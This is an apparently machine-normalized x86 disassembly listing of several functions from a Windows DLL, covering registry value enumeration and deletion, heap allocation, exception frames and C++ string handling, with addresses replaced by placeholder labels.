sub_10001000
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
xor esi esi
cmp [ eax ] esi
jbe r-xdata
pop esi
pop ebp
retn
lea ecx [ ecx ]
mov edx [ ebp + 0x14 ]
inc esi
cmp esi [ edx ]
jb r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x18 ]
push ecx
push edx
call [ StrStrW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0xc ]
push edi
push ecx
push 0x0
push 0x0
push ebx
mov [ ebx ] 0xff
push edx
mov [ edi ] 0x208
mov ecx [ eax ]
push esi
push ecx
call [ RegEnumValueW@IAT ]
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push eax
push edx
call [ RegDeleteValueW@IAT ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
sub_10001080
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
lea ebx [ ebx ]
pop edi
mov eax esi
pop esi
pop ebp
retn
inc esi
cmp esi 0x96
jl r-xdata
mov eax [ esi * 4 + rw-data ]
push eax
push edi
call sub_10028b2b
add esp 0x8
test eax eax
je r-xdata
pop edi
mov eax 0x95
pop esi
pop ebp
retn
sub_100010c0
push esi
mov esi ecx
cmp [ esi + 0xec ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xbc ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0xd4 ]
call eax
mov [ esi + 0xb8 ] 0x0
mov ecx [ esi + 0xd4 ]
push eax
call ecx
mov [ esi + 0xbc ] 0x0
sub_10001108
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000b659
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10005dab
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_10001150
push ebp
mov ebp esp
push 0xffffffff
push sub_1008121e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor ebx ebx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_100601f0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x230 ]
push ebx
push ecx
call sub_10078970
add esp 0xc
lea ecx [ ebp - 0x230 ]
call sub_10044b20
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x234 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x238 ]
mov [ ebp - 0x238 ] ebx
mov [ ebp - 0x234 ] ebx
call sub_10028710
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x238 ] ebx
jne r-xdata
push 0x1
call sub_1005ac7e
add esp 0x4
push eax
lea ecx [ ebp - 0x240 ]
mov [ ebp - 0x240 ] ebx
mov [ ebp - 0x23c ] ebx
call sub_100655d0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x240 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x234 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x230 ]
push ecx
lea esi [ ebp - 0x238 ]
call sub_10031da0
test eax eax
je r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov ebx [ ebp - 0x238 ]
call sub_10007e40
test eax eax
je r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
mov eax esi
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea esi [ ebx + 0xe8 ]
lea edx [ ebp - 0x244 ]
mov eax 0xcc
add ebx 0x104
call sub_1001bb80
lea edx [ ebp - 0x24 ]
mov eax 0x152
call sub_1001bb80
fld [ ebp + 0x8 ]
fld [ r--data ]
fsubr st1
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fabs
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x5
jpe r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub esp 0x8
lea edx [ ebp - 0x24 ]
fstp [ esp ]
push edx
lea eax [ ebp - 0x18 ]
push eax
mov edx 0x4
call sub_1006b8d0
add esp 0x10
lea edx [ ebp - 0x18 ]
fstp st0
lea edx [ ebp - 0x244 ]
jmp r-xdata
sub esp 0x8
lea ecx [ ebp - 0x24 ]
fstp [ esp ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
mov edx 0x4
call sub_1006b8d0
add esp 0x10
lea edx [ ebp - 0x18 ]
fstp st0
lea edx [ ebp - 0x244 ]
jmp r-xdata
push esi
call sub_10049460
fld [ ebp + 0xc ]
fld [ r--data ]
fsubr st1
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fabs
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x5
jpe r-xdata
call sub_100260d0
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
xor eax eax
call sub_100260d0
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0x6
jmp r-xdata
push ebx
call sub_10049460
lea ecx [ ebp - 0x238 ]
call sub_1005fd20
test eax eax
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x240 ]
je r-xdata
sub_10001470
push ebp
mov ebp esp
push 0xffffffff
push sub_100808aa
mov eax [ fs : 0x0 ]
push eax
sub esp 0x180
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
cmp [ ebx + 0xec ] 0x0
mov edi edx
mov [ ebp - 0x178 ] eax
mov [ ebp - 0x180 ] edi
jne r-xdata
push 0x10
lea ecx [ edi + 0x24 ]
lea esi [ ebp - 0x164 ]
call sub_1006a560
add esp 0x4
mov ecx [ ebp - 0x180 ]
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ edi + 0x24 ]
mov ecx [ ecx + 0x34 ]
push eax
push ecx
mov edi 0xf
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x30 ] dl
call sub_1005d090
mov eax [ ebp - 0x178 ]
mov edx esi
push edx
push eax
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x4 ] 0x1
call sub_10064e20
add esp 0xc
lea ecx [ ebp - 0x30 ]
lea esi [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x2
call sub_1000c8b0
mov esi 0x10
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov eax 0x42
jmp r-xdata
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0xbc ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0xa8 ] esi
jae r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_10065045
add esp 0x4
mov edx [ ebp - 0xac ]
call sub_10053f90
push 0x5
lea esi [ ebp - 0x174 ]
mov edi ebx
mov [ ebp - 0x178 ] eax
call sub_10042df0
mov [ ebp - 0x4 ] 0x6
push 0x2
push r--data
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0xc4 ] 0xf
mov [ ebp - 0xc8 ] 0x0
mov [ ebp - 0xd8 ] 0x0
call sub_1005d090
mov [ ebp - 0x4 ] 0x7
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
lea ecx [ ebp - 0xbc ]
push esi
lea eax [ ebp - 0x174 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_1001ad10
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1003b4a6
push esi
push ebx
lea eax [ ebp - 0x174 ]
call sub_1002a5c0
lea ecx [ ebp - 0xbc ]
push ecx
lea edx [ ebp - 0x110 ]
push r--data
push edx
mov [ ebp - 0x180 ] eax
call sub_10051900
add esp 0xc
mov [ ebp - 0x4 ] 0x8
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x174 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0x110 ]
call sub_1001ad10
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_1002a5c0
mov edx [ ebp - 0x178 ]
push edx
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x188 ] eax
call sub_100542c0
push eax
lea eax [ ebp - 0xf4 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x9
call sub_10025a80
add esp 0x10
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x54 ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0xf
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
cmp eax 0x2
ja r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_10065045
add esp 0x4
lea eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xf4 ]
call sub_1001ad10
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ edi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_1002a5c0
push 0x1
push r--data
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x178 ] eax
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0xa0 ] 0x0
call sub_1005d090
mov [ ebp - 0x4 ] 0xc
cmp [ ebx ] 0x0
push 0x1
lea ecx [ ebp - 0xa0 ]
jne r-xdata
push r--data
call sub_1003b4a6
push r--data
push r--data
jmp r-xdata
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_1001ad10
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
push r--data
call sub_1003b4a6
call sub_1005be50
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_1002a5c0
push 0x24ac4
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x184 ] eax
call sub_1006a380
push eax
lea edx [ ebp - 0x12c ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xd
call sub_10025a80
add esp 0x10
mov [ ebp - 0x4 ] 0xf
cmp [ ebp - 0x54 ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x54 ] 0xf
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
cmp ecx 0x4
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0x12c ]
call sub_1001ad10
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x70 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_1002a5c0
mov ecx [ ebp - 0x180 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
mov [ ebp - 0x17c ] eax
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x11
call sub_1000c8b0
mov ecx eax
mov [ ebp - 0x4 ] 0x12
mov esi [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1003b4a6
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10040f60
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1003b4a6
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x70 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x188 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x14
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x178 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xf4 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x17
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_10065045
add esp 0x4
lea ecx [ edi + 0x38 ]
push 0xffffffff
xor edi edi
push edi
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x184 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1a
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x17c ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1d
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x70 ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0x148 ]
push ecx
lea edi [ ebp - 0x174 ]
call sub_10005d00
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x1f
mov [ ebp - 0x17c ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0x148 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_100146b0
mov eax [ ebx + 0xe0 ]
push eax
push ebx
call sub_10019070
mov ebx 0x10
mov [ ebp - 0x17c ] eax
cmp [ ebp - 0x134 ] ebx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0x134 ] edi
mov [ ebp - 0x138 ] esi
mov [ ebp - 0x148 ] 0x0
cmp [ ebp - 0x118 ] ebx
jb r-xdata
mov ecx [ ebp - 0x148 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x11c ] esi
mov [ ebp - 0x12c ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov edx [ ebp - 0x12c ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0xa0 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0xfc ] ebx
jb r-xdata
mov ecx [ ebp - 0xf4 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x100 ] esi
mov [ ebp - 0x110 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov edx [ ebp - 0x110 ]
push edx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x174 ]
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp eax esi
je r-xdata
mov eax [ ebp - 0xd8 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0x174 ] esi
mov [ ebp - 0x170 ] esi
mov [ ebp - 0x16c ] esi
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x17c ]
push ecx
mov ecx [ ebp - 0x170 ]
lea edx [ ebp - 0x168 ]
push edx
push ecx
push eax
call sub_1000c130
mov edx [ ebp - 0x174 ]
push edx
call sub_10065045
add esp 0x14
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x150 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x17c ]
mov ecx [ ebp - 0x164 ]
push ecx
call sub_10065045
add esp 0x4
sub_10002020
push ebp
mov ebp esp
push 0xffffffff
push sub_1008129d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
mov edi ecx
xor ebx ebx
push ebx
mov [ ebp - 0x2fc ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x304 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_100601f0
jmp r-xdata
push 0x208
lea eax [ ebp - 0x218 ]
push ebx
push eax
call sub_10078970
add esp 0xc
lea ecx [ ebp - 0x218 ]
call sub_10044b20
test eax eax
je r-xdata
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x2e0 ]
cmp esi ebx
je r-xdata
or esi 0xffffffff
mov [ ebp - 0x4 ] esi
push eax
lea ecx [ ebp - 0x2e4 ]
mov [ ebp - 0x2e4 ] ebx
mov [ ebp - 0x2e0 ] ebx
call sub_10028710
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x2e4 ] ebx
jne r-xdata
push 0x1
call sub_1005ac7e
add esp 0x4
push eax
lea ecx [ ebp - 0x2ec ]
mov [ ebp - 0x2ec ] ebx
mov [ ebp - 0x2e8 ] ebx
call sub_100655d0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x2ec ] ebx
jne r-xdata
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x2e0 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea esi [ ebp - 0x2e4 ]
call sub_10031da0
test eax eax
je r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x2e4 ]
mov [ ebp - 0x4 ] esi
call sub_100260d0
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ebx [ ebp - 0x2e4 ]
call sub_10007e40
test eax eax
je r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
mov eax esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
mov eax 0x4
jmp r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
cmp [ edi + 0x14 ] 0x8
jb r-xdata
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
